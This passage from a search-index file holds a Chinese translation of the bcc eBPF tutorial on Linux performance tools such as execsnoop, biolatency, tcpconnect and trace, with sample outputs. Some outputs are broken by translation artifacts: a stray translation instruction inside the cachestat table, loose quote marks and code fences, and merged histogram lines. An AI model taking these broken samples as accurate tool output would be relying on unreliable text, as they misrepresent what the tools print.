how on the <code>execsnoop</code> terminal you started above the call is logged:</p> <pre><code># tools/execsnoop.py --mntnsmap /sys/fs/bpf/mnt_ns_set\n[sudo] password for mvb:\nPCOMM            PID    PPID   RET ARGS\nping             8096   7970     0 /bin/ping kinvolk.io\n</code></pre> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/tutorial/","title":"bcc \u6559\u7a0b","text":"<p>\u672c\u6559\u7a0b\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528bcc\u5de5\u5177\u5feb\u901f\u89e3\u51b3\u6027\u80fd\u3001\u6545\u969c\u6392\u9664\u548c\u7f51\u7edc\u95ee\u9898\u3002\u5982\u679c\u4f60\u60f3\u5f00\u53d1\u65b0\u7684bcc\u5de5\u5177\uff0c\u8bf7\u53c2\u8003tutorial_bcc_python_developer.md\u6559\u7a0b\u3002</p> <p>\u672c\u6559\u7a0b\u5047\u8bbebcc\u5df2\u7ecf\u5b89\u88c5\u597d\uff0c\u5e76\u4e14\u4f60\u53ef\u4ee5\u6210\u529f\u8fd0\u884c\u50cfexecsnoop\u8fd9\u6837\u7684\u5de5\u5177\u3002\u53c2\u89c1INSTALL.md\u3002\u8fd9\u4e9b\u529f\u80fd\u662f\u5728Linux 4.x\u7cfb\u5217\u4e2d\u589e\u52a0\u7684\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#_1","title":"\u53ef\u89c2\u5bdf\u6027","text":"<p>\u4e00\u4e9b\u5feb\u901f\u7684\u6536\u83b7\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#0-bcc","title":"0. \u4f7f\u7528bcc\u4e4b\u524d","text":"<p>\u5728\u4f7f\u7528bcc\u4e4b\u524d\uff0c\u4f60\u5e94\u8be5\u4eceLinux\u57fa\u7840\u77e5\u8bc6\u5f00\u59cb\u3002\u53ef\u4ee5\u53c2\u8003Linux Performance Analysis in 60,000 Milliseconds\u6587\u7ae0\uff0c\u5176\u4e2d\u4ecb\u7ecd\u4e86\u4ee5\u4e0b\u547d\u4ee4\uff1a</p> <ol> <li>uptime</li> <li>dmesg | tail</li> <li>vmstat 1</li> <li>mpstat -P ALL 1</li> <li>pidstat 1</li> <li>iostat -xz 1</li> <li>free -m</li> <li>sar -n DEV 1</li> <li>sar -n TCP,ETCP 1</li> <li>top</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial/#1","title":"1. \u6027\u80fd\u5206\u6790","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u6027\u80fd\u8c03\u67e5\u7684\u901a\u7528\u68c0\u67e5\u6e05\u5355\uff0c\u9996\u5148\u6709\u4e00\u4e2a\u5217\u8868\uff0c\u7136\u540e\u8be6\u7ec6\u63cf\u8ff0\uff1a</p> <ol> <li>execsnoop</li> <li>opensnoop</li> <li>ext4slower\uff08\u6216btrfs*\uff0cxfs*\uff0czfs*\uff09</li> <li>biolatency</li> <li>biosnoop</li> <li>cachestat</li> <li>tcpconnect</li> <li>tcpaccept</li> <li>tcpretrans</li> <li>runqlat</li> <li>profile</li> </ol> <p>\u8fd9\u4e9b\u5de5\u5177\u53ef\u80fd\u5df2\u7ecf\u5b89\u88c5\u5728\u4f60\u7684\u7cfb\u7edf\u7684/usr/share/bcc/tools\u76ee\u5f55\u4e0b\uff0c\u6216\u8005\u4f60\u53ef\u4ee5\u4ecebcc github\u4ed3\u5e93\u7684/tools\u76ee\u5f55\u4e2d\u8fd0\u884c\u5b83\u4eec\uff0c\u8fd9\u4e9b\u5de5\u5177\u4f7f\u7528.py\u6269\u5c55\u540d\u3002\u6d4f\u89c850\u591a\u4e2a\u53ef\u7528\u7684\u5de5\u5177\uff0c\u83b7\u5f97\u66f4\u591a\u7684\u5206\u6790\u9009\u9879\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#11-execsnoop","title":"1.1 execsnoop","text":"<pre><code># ./execsnoop\nPCOMM            PID    RET ARGS\nsupervise        9660     0 ./run\nsupervise        9661     0 ./run\nmkdir            9662     0 /bin/mkdir -p ./main\nrun              9663     0 ./run\n[...]\n</code></pre> <p>execsnoop\u5bf9\u4e8e\u6bcf\u4e2a\u65b0\u8fdb\u7a0b\u6253\u5370\u4e00\u884c\u8f93\u51fa\u3002\u68c0\u67e5\u77ed\u751f\u547d\u5468\u671f\u7684\u8fdb\u7a0b\u3002\u8fd9\u4e9b\u8fdb\u7a0b\u53ef\u80fd\u4f1a\u6d88\u8017CPU\u8d44\u6e90\uff0c\u4f46\u4e0d\u4f1a\u5728\u5927\u591a\u6570\u5468\u671f\u6027\u8fd0\u884c\u7684\u8fdb\u7a0b\u76d1\u63a7\u5de5\u5177\u4e2d\u663e\u793a\u51fa\u6765\u3002\u5b83\u901a\u8fc7\u8ddf\u8e2a<code>exec()</code>\u6765\u5de5\u4f5c\uff0c\u800c\u4e0d\u662f<code>fork()</code>\uff0c\u6240\u4ee5\u5b83\u53ef\u4ee5\u6355\u83b7\u8bb8\u591a\u7c7b\u578b\u7684\u65b0\u8fdb\u7a0b\uff0c\u4f46\u4e0d\u662f\u6240\u6709\u7c7b\u578b\uff08\u4f8b\u5982\uff0c\u5b83\u4e0d\u4f1a\u770b\u5230\u542f\u52a8\u5de5\u4f5c\u8fdb\u7a0b\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u8be5\u5e94\u7528\u7a0b\u5e8f\u6ca1\u6709<code>exec()</code>\u5176\u4ed6\u4efb\u4f55\u5185\u5bb9\uff09\u3002</p> <p>\u66f4\u591a\u4f8b\u5b50\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#12-opensnoop","title":"1.2. opensnoop","text":"<pre><code># ./opensnoop\nPID    COMM               FD ERR PATH\n1565   redis-server        5   0 /proc/1565/stat\n1565   redis-server        5   0 /proc/1565/stat\n1565   redis-server        5   0 /proc/1565/stat\n1603   snmpd               9   0 /proc/net/dev\n1603   snmpd              11   0 /proc/net/if_inet6\n1603   snmpd              -1   2 /sys/class/net/eth0/device/vendor\n1603   snmpd              11   0 /proc/sys/net/ipv4/neigh/eth0/retrans_time_ms\n1603   snmpd              11   0 /proc/sys/net/ipv6/neigh/eth0/retrans_time_ms\n1603   snmpd              11   0 /proc/sys/net/ipv6/conf/eth0/forwarding\n[...]\n</code></pre> <p>opensnoop\u6bcf\u6b21open() syscall\u6267\u884c\u65f6\u6253\u5370\u4e00\u884c\u8f93\u51fa\uff0c\u5305\u62ec\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u6253\u5f00\u7684\u6587\u4ef6\u53ef\u4ee5\u544a\u8bc9\u4f60\u5f88\u591a\u5173\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u65b9\u5f0f\u7684\u4fe1\u606f\uff1a\u5b83\u4eec\u7684\u6570\u636e\u6587\u4ef6\u3001\u914d\u7f6e\u6587\u4ef6\u548c\u65e5\u5fd7\u6587\u4ef6\u3002\u6709\u65f6\u5019\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u8868\u73b0\u4e0d\u6b63\u5e38\uff0c\u5f53\u5b83\u4eec\u4e0d\u65ad\u5c1d\u8bd5\u8bfb\u53d6\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u65f6\u5219\u4f1a\u8868\u73b0\u5f97\u5f88\u5dee\u3002opensnoop\u80fd\u591f\u5feb\u901f\u5e2e\u52a9\u4f60\u67e5\u770b\u3002</p> <p>\u66f4\u591a\u4f8b\u5b50\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#13-ext4slowerbtrfsxfszfs","title":"1.3. ext4slower\uff08\u6216btrfs*\uff0cxfs*\uff0czfs*\uff09","text":"<pre><code># ./ext4slower\n\u8ffd\u8e2a\u8d85\u8fc710\u6beb\u79d2\u7684ext4\u64cd\u4f5c\n\u65f6\u95f4     \u8fdb\u7a0b           \u8fdb\u7a0bID    T \u5b57\u8282\u6570   \u504f\u79fbKB   \u5ef6\u8fdf(ms) \u6587\u4ef6\u540d\n06:35:01 cron           16464  R 1249    0          16.05 common-auth\n06:35:01 cron           16463  R 1249    0          16.04 common-auth\n06:35:01 cron           16465  R 1249    0          16.03 common-auth\n06:35:01 cron           16465  R 4096    0          10.62 login.defs\n06:35:01 cron           16464  R 4096    0          10.61 login.defs\n</code></pre> <p>ext4slower\u8ddf\u8e2aext4\u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u8ba1\u65f6\u5e38\u89c1\u64cd\u4f5c\uff0c\u7136\u540e\u53ea\u6253\u5370\u8d85\u8fc7\u9608\u503c\u7684\u64cd\u4f5c\u3002\u8fd9\u5bf9\u4e8e\u8bc6\u522b\u6216\u8bc1\u660e\u4e00\u79cd\u6027\u80fd\u95ee\u9898\u975e\u5e38\u65b9\u4fbf\uff1a\u901a\u8fc7\u6587\u4ef6\u7cfb\u7edf\u5355\u72ec\u663e\u793a\u8f83\u6162\u7684\u78c1\u76d8 I/O\u3002\u78c1\u76d8\u4ee5\u5f02\u6b65\u65b9\u5f0f\u5904\u7406 I/O\uff0c\u5f88\u96be\u5c06\u8be5\u5c42\u7684\u5ef6\u8fdf\u4e0e\u5e94\u7528\u7a0b\u5e8f\u6240\u7ecf\u5386\u7684\u5ef6\u8fdf\u5173\u8054\u8d77\u6765\u3002\u5728\u5185\u6838\u5806\u6808\u4e2d\u66f4\u9ad8\u5c42\u7684\u8ffd\u8e2a\uff0c\u5373\u5728 VFS -&gt; \u6587\u4ef6\u7cfb\u7edf\u63a5\u53e3\u4e2d\uff0c\u4f1a\u66f4\u63a5\u8fd1\u5e94\u7528\u7a0b\u5e8f\u906d\u53d7\u7684\u5ef6\u8fdf\u3002\u4f7f\u7528\u6b64\u5de5\u5177\u6765\u5224\u65ad\u6587\u4ef6\u7cfb\u7edf\u7684\u5ef6\u8fdf\u662f\u5426\u8d85\u8fc7\u4e86\u7ed9\u5b9a\u7684\u9608\u503c\u3002</p> <p>\u5728 bcc \u4e2d\u5b58\u5728\u5176\u4ed6\u6587\u4ef6\u7cfb\u7edf\u7684\u7c7b\u4f3c\u5de5\u5177\uff1abtrfsslower\u3001xfsslower \u548c zfsslower\u3002\u8fd8\u6709\u4e00\u4e2a\u540d\u4e3a fileslower \u7684\u5de5\u5177\uff0c\u5b83\u5728 VFS \u5c42\u5de5\u4f5c\u5e76\u8ddf\u8e2a\u6240\u6709\u5185\u5bb9\uff08\u5c3d\u7ba1\u4f1a\u6709\u66f4\u9ad8\u7684\u5f00\u9500\uff09\u3002</p> <p>\u66f4\u591a\u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#14-biolatency","title":"1.4. biolatency","text":"<pre><code># ./biolatency\n\u8ddf\u8e2a\u5757\u8bbe\u5907\u7684 I/O... \u6309 Ctrl-C \u7ed3\u675f\u3002\n^C\n     \u5fae\u79d2             : \u6570\u91cf      \u5206\u5e03\n       0 -&gt; 1        : 0        |                                      |\n       2 -&gt; 3        : 0        |                                      |\n       4 -&gt; 7        : 0        |                                      |\n       8 -&gt; 15       : 0        |                                      |\n      16 -&gt; 31       : 0        |                                      |\n      32 -&gt; 63       : 0        |                                      |\n      64 -&gt; 127      : 1        |                                      |\n     128 -&gt; 255      : 12       |********                              |\n     256 -&gt; 511      : 15       |**********                            |\n     512 -&gt; 1023     : 43       |*******************************       |\n    1024 -&gt; 2047     : 52       |**************************************|\n    2048 -&gt; 4095     : 47       |**********************************    |\n    4096 -&gt; 8191     : 52       |**************************************|\n    8192 -&gt; 16383    : 36       |**************************            |\n   16384 -&gt; 32767    : 15       |**********                            |\u300232768 -&gt; 65535    : 2        |*                                     |\n   65536 -&gt; 131071   : 2        |*                                     |\n</code></pre> <p>biolatency\u8ddf\u8e2a\u78c1\u76d8I/O\u5ef6\u8fdf\uff08\u4ece\u8bbe\u5907\u6267\u884c\u5230\u5b8c\u6210\u7684\u65f6\u95f4\uff09\uff0c\u5f53\u5de5\u5177\u7ed3\u675f\uff08Ctrl-C\uff0c\u6216\u7ed9\u5b9a\u7684\u95f4\u9694\uff09\u65f6\uff0c\u5b83\u4f1a\u6253\u5370\u5ef6\u8fdf\u7684\u76f4\u65b9\u56fe\u6458\u8981\u3002</p> <p>\u8fd9\u5bf9\u4e8e\u4e86\u89e3\u8d85\u51faiostat\u7b49\u5de5\u5177\u63d0\u4f9b\u7684\u5e73\u5747\u65f6\u95f4\u7684\u78c1\u76d8I/O\u5ef6\u8fdf\u975e\u5e38\u6709\u7528\u3002\u5728\u5206\u5e03\u7684\u672b\u5c3e\u5c06\u53ef\u89c1I/O\u5ef6\u8fdf\u7684\u5f02\u5e38\u503c\uff0c\u4ee5\u53ca\u591a\u79cd\u6a21\u5f0f\u7684\u5206\u5e03\u3002</p> <p>\u66f4\u591a\u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#15-biosnoop","title":"1.5. biosnoop","text":"<pre><code># ./biosnoop\nTIME(s)        COMM           PID    DISK    T  SECTOR    BYTES   LAT(ms)\n0.000004001    supervise      1950   xvda1   W  13092560  4096       0.74\n0.000178002    supervise      1950   xvda1   W  13092432  4096       0.61\n0.001469001    supervise      1956   xvda1   W  13092440  4096       1.24\n0.001588002    supervise      1956   xvda1   W  13115128  4096       1.09\n1.022346001    supervise      1950   xvda1   W  13115272  4096       0.98\n1.022568002    supervise      1950   xvda1   W  13188496  4096       0.93\n[...]\n</code></pre> <p>biosnoop\u4e3a\u6bcf\u4e2a\u78c1\u76d8I/O\u6253\u5370\u4e00\u884c\u8f93\u51fa\uff0c\u5176\u4e2d\u5305\u62ec\u5ef6\u8fdf\uff08\u4ece\u8bbe\u5907\u6267\u884c\u5230\u5b8c\u6210\u7684\u65f6\u95f4\uff09\u7b49\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u8fd9\u8ba9\u60a8\u53ef\u4ee5\u66f4\u8be6\u7ec6\u5730\u7814\u7a76\u78c1\u76d8I/O\uff0c\u5e76\u5bfb\u627e\u6309\u65f6\u95f4\u6392\u5e8f\u7684\u6a21\u5f0f\uff08\u4f8b\u5982\uff0c\u8bfb\u53d6\u5728\u5199\u5165\u540e\u6392\u961f\uff09\u3002\u8bf7\u6ce8\u610f\uff0c\u5982\u679c\u60a8\u7684\u7cfb\u7edf\u4ee5\u9ad8\u901f\u7387\u6267\u884c\u78c1\u76d8I/O\uff0c\u5219\u8f93\u51fa\u5c06\u5197\u957f\u3002</p> <p>\u66f4\u591a\u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#16-cachestat","title":"1.6. cachestat","text":"<pre><code># ./cachestat\n    HITS   MISSES  DIRTIES  READ_HIT% WRITE_HIT%   BUFFERS_MB  CACHED_MB\n    1074       44       13      94.9%       2.9%            1        223\n    2195      170        8      92.5%       6.8%            1        143\n     182       53       56      53.6%       1.3%            1        143\n   62480    40960    20480      40.6%      19.8%            1        223\"\u3002\n\u683c\u5f0f\uff1a\u4ec5\u8fd4\u56de\u7ffb\u8bd1\u540e\u7684\u5185\u5bb9\uff0c\u4e0d\u5305\u62ec\u539f\u59cb\u6587\u672c\u3002```\n7        2        5      22.2%      22.2%            1        223\n     348        0        0     100.0%       0.0%            1        223\n[...]\n</code></pre> <p>cachestat \u6bcf\u79d2\uff08\u6216\u6bcf\u4e2a\u81ea\u5b9a\u4e49\u65f6\u95f4\u95f4\u9694\uff09\u6253\u5370\u4e00\u884c\u6458\u8981\uff0c\u663e\u793a\u6587\u4ef6\u7cfb\u7edf\u7f13\u5b58\u7684\u7edf\u8ba1\u4fe1\u606f\u3002</p> <p>\u53ef\u4ee5\u7528\u5b83\u6765\u8bc6\u522b\u4f4e\u7f13\u5b58\u547d\u4e2d\u7387\u548c\u9ad8\u7f3a\u5931\u7387\uff0c\u8fd9\u662f\u6027\u80fd\u8c03\u4f18\u7684\u7ebf\u7d22\u4e4b\u4e00\u3002</p> <p>\u66f4\u591a \u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#17-tcpconnect","title":"1.7. tcpconnect","text":"<pre><code># ./tcpconnect\nPID    COMM         IP SADDR            DADDR            DPORT\n1479   telnet       4  127.0.0.1        127.0.0.1        23\n1469   curl         4  10.201.219.236   54.245.105.25    80\n1469   curl         4  10.201.219.236   54.67.101.145    80\n1991   telnet       6  ::1              ::1              23\n2015   ssh          6  fe80::2000:bff:fe82:3ac fe80::2000:bff:fe82:3ac 22\n[...]\n</code></pre> <p>tcpconnect \u6bcf\u4e2a\u6d3b\u52a8\u7684 TCP \u8fde\u63a5\uff08\u4f8b\u5982\u901a\u8fc7 connect()\uff09\u6253\u5370\u4e00\u884c\u8f93\u51fa\uff0c\u5305\u62ec\u6e90\u5730\u5740\u548c\u76ee\u6807\u5730\u5740\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u5bfb\u627e\u53ef\u80fd\u6307\u5411\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u95ee\u9898\u6216\u5165\u4fb5\u8005\u7684\u610f\u5916\u8fde\u63a5\u3002</p> <p>\u66f4\u591a \u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#18-tcpaccept","title":"1.8. tcpaccept","text":"<pre><code># ./tcpaccept\nPID    COMM         IP RADDR            LADDR            LPORT\n907    sshd         4  192.168.56.1     192.168.56.102   22\n907    sshd         4  127.0.0.1        127.0.0.1        22\n5389   perl         6  1234:ab12:2040:5020:2299:0:5:0 1234:ab12:2040:5020:2299:0:5:0 7001\n[...]\n</code></pre> <p>tcpaccept \u6bcf\u4e2a\u88ab\u52a8\u7684 TCP \u8fde\u63a5\uff08\u4f8b\u5982\u901a\u8fc7 accept()\uff09\u6253\u5370\u4e00\u884c\u8f93\u51fa\uff0c\u5305\u62ec\u6e90\u5730\u5740\u548c\u76ee\u6807\u5730\u5740\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u5bfb\u627e\u53ef\u80fd\u6307\u5411\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u95ee\u9898\u6216\u5165\u4fb5\u8005\u7684\u610f\u5916\u8fde\u63a5\u3002</p> <p>\u66f4\u591a \u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#19-tcpretrans","title":"1.9. tcpretrans","text":"<pre><code># ./tcpretrans\".\n```\u65f6\u95f4 PID IP LADDR:LPORT T&gt; RADDR:RPORT \u72b6\u6001\n01:55:05 0 4 10.153.223.157:22 R&gt; 69.53.245.40:34619 \u5df2\u5efa\u7acb\n01:55:05 0 4 10.153.223.157:22 R&gt; 69.53.245.40:34619 \u5df2\u5efa\u7acb\n01:55:17 0 4 10.153.223.157:22 R&gt; 69.53.245.40:22957 \u5df2\u5efa\u7acb\n[...]\n</code></pre> <p>tcpretrans\u4e3a\u6bcf\u4e2aTCP\u91cd\u4f20\u6570\u636e\u5305\u6253\u5370\u4e00\u884c\u8f93\u51fa\uff0c\u5176\u4e2d\u5305\u62ec\u6e90\u5730\u5740\u3001\u76ee\u7684\u5730\u5740\u4ee5\u53caTCP\u8fde\u63a5\u7684\u5185\u6838\u72b6\u6001\u3002</p> <p>TCP\u91cd\u4f20\u4f1a\u5bfc\u81f4\u5ef6\u8fdf\u548c\u541e\u5410\u91cf\u95ee\u9898\u3002\u5bf9\u4e8e\u5df2\u5efa\u7acb\u7684\u91cd\u4f20\uff0c\u53ef\u4ee5\u67e5\u627e\u4e0e\u7f51\u7edc\u6709\u5173\u7684\u6a21\u5f0f\u3002\u5bf9\u4e8eSYN_SENT\uff0c\u53ef\u80fd\u6307\u5411\u76ee\u6807\u5185\u6838CPU\u9971\u548c\u548c\u5185\u6838\u6570\u636e\u5305\u4e22\u5931\u3002</p> <p>\u66f4\u591a\u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#110-runqlat","title":"1.10. runqlat","text":"<pre><code># ./runqlat\n\u8ddf\u8e2a\u8fd0\u884c\u961f\u5217\u5ef6\u8fdf... \u6309Ctrl-C\u7ed3\u675f\u3002\n^C\n     \u5fae\u79d2\u6570               : \u8ba1\u6570     \u5206\u5e03\n         0 -&gt; 1          : 233      |***********                             |\n         2 -&gt; 3          : 742      |************************************    |\n         4 -&gt; 7          : 203      |**********                              |\n         8 -&gt; 15         : 173      |********                                |\n        16 -&gt; 31         : 24       |*                                       |\n        32 -&gt; 63         : 0        |                                        |\n        64 -&gt; 127        : 30       |*                                       |\n       128 -&gt; 255        : 6        |                                        |\n       256 -&gt; 511        : 3        |                                        |\n       512 -&gt; 1023       : 5        |                                        |\n      1024 -&gt; 2047       : 27       |*                                       |\n      2048 -&gt; 4095       : 30       |*                                       |\n      4096 -&gt; 8191       : 20       |                                        |\n      8192 -&gt; 16383      : 29       |*                                       |\".16384 -&gt; 32767      : 809      |****************************************|\n32768 -&gt; 65535      : 64       |***                                     |\n</code></pre> <p>\u8fd9\u53ef\u4ee5\u5e2e\u52a9\u91cf\u5316\u5728CPU\u9971\u548c\u671f\u95f4\u7b49\u5f85\u83b7\u53d6CPU\u7684\u65f6\u95f4\u635f\u5931\u3002</p> <p>\u66f4\u591a\u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#111","title":"1.11. \u5206\u6790","text":"<pre><code># ./profile\n\u4ee5\u6bcf\u79d249\u6b21\u7684\u9891\u7387\u5bf9\u6240\u6709\u7ebf\u7a0b\u8fdb\u884c\u91c7\u6837\uff0c\u5305\u62ec\u7528\u6237\u548c\u5185\u6838\u6808...\u6309Ctrl-C\u7ed3\u675f\u3002\n^C\n    00007f31d76c3251 [\u672a\u77e5]\n    47a2c1e752bf47f7 [\u672a\u77e5]\n    -                sign-file (8877)\n        1\n\n    ffffffff813d0af8 __clear_user\n    ffffffff813d5277 iov_iter_zero\n    ffffffff814ec5f2 read_iter_zero\n    ffffffff8120be9d __vfs_read\n    ffffffff8120c385 vfs_read\n    ffffffff8120d786 sys_read\n    ffffffff817cc076 entry_SYSCALL_64_fastpath\n    00007fc5652ad9b0 read\n    -                dd (25036)\n        4\n\n    0000000000400542 func_a\n    0000000000400598 main\n    00007f12a133e830 __libc_start_main\n    083e258d4c544155 [\u672a\u77e5]\n    -                func_ab (13549)\n        5\n\n[...]\n\n    ffffffff8105eb66 native_safe_halt\n    ffffffff8103659e default_idle\n    ffffffff81036d1f arch_cpu_idle\n    ffffffff810bba5a default_idle_call\n    ffffffff810bbd07 cpu_startup_entry\n    ffffffff8104df55 start_secondary\n    -                swapper/1 (0)\n        75\n</code></pre> <p>profile\u662f\u4e00\u4e2aCPU\u5206\u6790\u5de5\u5177\uff0c\u5b83\u5728\u5b9a\u65f6\u95f4\u9694\u5185\u91c7\u6837\u5806\u6808\u8ddf\u8e2a\uff0c\u5e76\u6253\u5370\u552f\u4e00\u5806\u6808\u8ddf\u8e2a\u7684\u6458\u8981\u53ca\u5176\u51fa\u73b0\u6b21\u6570\u3002</p> <p>\u4f7f\u7528\u6b64\u5de5\u5177\u6765\u4e86\u89e3\u6d88\u8017CPU\u8d44\u6e90\u7684\u4ee3\u7801\u8def\u5f84\u3002</p> <p>\u66f4\u591a\u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#2","title":"2. \u4f7f\u7528\u901a\u7528\u5de5\u5177\u8fdb\u884c\u53ef\u89c2\u5bdf\u6027","text":"<p>\u9664\u4e86\u4e0a\u8ff0\u7528\u4e8e\u6027\u80fd\u8c03\u6574\u7684\u5de5\u5177\u5916\uff0c\u4e0b\u9762\u662f\u4e00\u4e2abcc\u901a\u7528\u5de5\u5177\u7684\u6e05\u5355\uff0c\u9996\u5148\u662f\u4e00\u4e2a\u5217\u8868\uff0c\u7136\u540e\u8be6\u7ec6\u8bf4\u660e\uff1a</p> <ol> <li>trace</li> <li>argdist</li> <li>funccount\u8fd9\u4e9b\u901a\u7528\u5de5\u5177\u53ef\u80fd\u6709\u52a9\u4e8e\u89e3\u51b3\u60a8\u7279\u5b9a\u95ee\u9898\u7684\u53ef\u89c6\u5316\u3002</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial/#21","title":"2.1. \u8ddf\u8e2a","text":""},{"location":"tutorials/bcc-documents/tutorial/#1_1","title":"\u793a\u4f8b 1","text":"<p>\u5047\u8bbe\u60a8\u60f3\u8981\u8ddf\u8e2a\u6587\u4ef6\u6240\u6709\u6743\u66f4\u6539\u3002\u6709\u4e09\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c<code>chown</code>\u3001<code>fchown</code>\u548c<code>lchown</code>\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u6765\u66f4\u6539\u6587\u4ef6\u6240\u6709\u6743\u3002\u76f8\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u5165\u53e3\u662f<code>SyS_[f|l]chown</code>\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6253\u5370\u7cfb\u7edf\u8c03\u7528\u53c2\u6570\u548c\u8c03\u7528\u8fdb\u7a0b\u7684\u7528\u6237ID\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528<code>id</code>\u547d\u4ee4\u67e5\u627e\u7279\u5b9a\u7528\u6237\u7684UID\u3002</p> <pre><code>$ trace.py \\\n  'p::SyS_chown \"file = %s, to_uid = %d, to_gid = %d, from_uid = %d\", arg1, arg2, arg3, $uid' \\\n  'p::SyS_fchown \"fd = %d, to_uid = %d, to_gid = %d, from_uid = %d\", arg1, arg2, arg3, $uid' \\\n  'p::SyS_lchown \"file = %s, to_uid = %d, to_gid = %d, from_uid = %d\", arg1, arg2, arg3, $uid'\nPID    TID    COMM         FUNC             -\n1269255 1269255 python3.6    SyS_lchown       file = /tmp/dotsync-usisgezu/tmp, to_uid = 128203, to_gid = 100, from_uid = 128203\n1269441 1269441 zstd         SyS_chown        file = /tmp/dotsync-vic7ygj0/dotsync-package.zst, to_uid = 128203, to_gid = 100, from_uid = 128203\n1269255 1269255 python3.6    SyS_lchown       file = /tmp/dotsync-a40zd7ev/tmp, to_uid = 128203, to_gid = 100, from_uid = 128203\n1269442 1269442 zstd         SyS_chown        file = /tmp/dotsync-gzp413o_/dotsync-package.zst, to_uid = 128203, to_gid = 100, from_uid = 128203\n1269255 1269255 python3.6    SyS_lchown       file = /tmp/dotsync-whx4fivm/tmp/.bash_profile, to_uid = 128203, to_gid = 100, from_uid = 128203\n</code></pre>"},{"location":"tutorials/bcc-documents/tutorial/#2_1","title":"\u793a\u4f8b 2","text":"<p>\u5047\u8bbe\u60a8\u60f3\u8981\u7edf\u8ba1\u57fa\u4e8ebpf\u7684\u6027\u80fd\u76d1\u63a7\u5de5\u5177\u4e2d\u7684\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff08<code>nvcsw</code>\uff09\uff0c\u800c\u60a8\u4e0d\u77e5\u9053\u6b63\u786e\u7684\u65b9\u6cd5\u662f\u4ec0\u4e48\u3002<code>/proc/&lt;pid&gt;/status</code>\u5df2\u7ecf\u544a\u8bc9\u60a8\u8fdb\u7a0b\u7684\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff08<code>nonvoluntary_ctxt_switches</code>\uff09\u7684\u6570\u91cf\uff0c\u5e76\u4e14\u60a8\u53ef\u4ee5\u4f7f\u7528<code>trace.py</code>\u8fdb\u884c\u5feb\u901f\u5b9e\u9a8c\u4ee5\u9a8c\u8bc1\u60a8\u7684\u65b9\u6cd5\u3002\u6839\u636e\u5185\u6838\u6e90\u4ee3\u7801\uff0c<code>nvcsw</code>\u5728\u6587\u4ef6<code>linux/kernel/sched/core.c</code>\u7684<code>__schedule</code>\u51fd\u6570\u4e2d\u8ba1\u6570\uff0c\u5e76\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a</p> <pre><code>.!(!preempt &amp;&amp; prev-&gt;state) // \u5373 preempt || !prev-&gt;state\n</code></pre> <p><code>__schedule</code> \u51fd\u6570\u88ab\u6807\u8bb0\u4e3a <code>notrace</code> \uff0c\u8bc4\u4f30\u4e0a\u8ff0\u6761\u4ef6\u7684\u6700\u4f73\u4f4d\u7f6e\u4f3c\u4e4e\u5728\u51fd\u6570 <code>__schedule</code> \u5185\u90e8\u7684 <code>sched/sched_switch</code> \u8ddf\u8e2a\u70b9\u4e2d\uff0c\u5e76\u4e14\u5728 <code>linux/include/trace/events/sched.h</code> \u4e2d\u5b9a\u4e49\u3002<code>trace.py</code> \u5df2\u7ecf\u5c06 <code>args</code> \u8bbe\u7f6e\u4e3a\u8ddf\u8e2a\u70b9 <code>TP_STRUCT__entry</code> \u7684\u6307\u9488\u3002\u51fd\u6570 <code>__schedule</code> \u4e2d\u7684\u4e0a\u8ff0\u6761\u4ef6\u53ef\u4ee5\u8868\u793a\u4e3a</p> <pre><code>args-&gt;prev_state == TASK_STATE_MAX || args-&gt;prev_state == 0\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u8ba1\u7b97\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff08\u6bcf\u4e2a\u8fdb\u7a0b\u6216\u6bcf\u4e2a\u8fdb\u7a0bID\uff09\uff0c\u5e76\u4e0e <code>/proc/&lt;pid&gt;/status</code> \u6216 <code>/proc/&lt;pid&gt;/task/&lt;task_id&gt;/status</code> 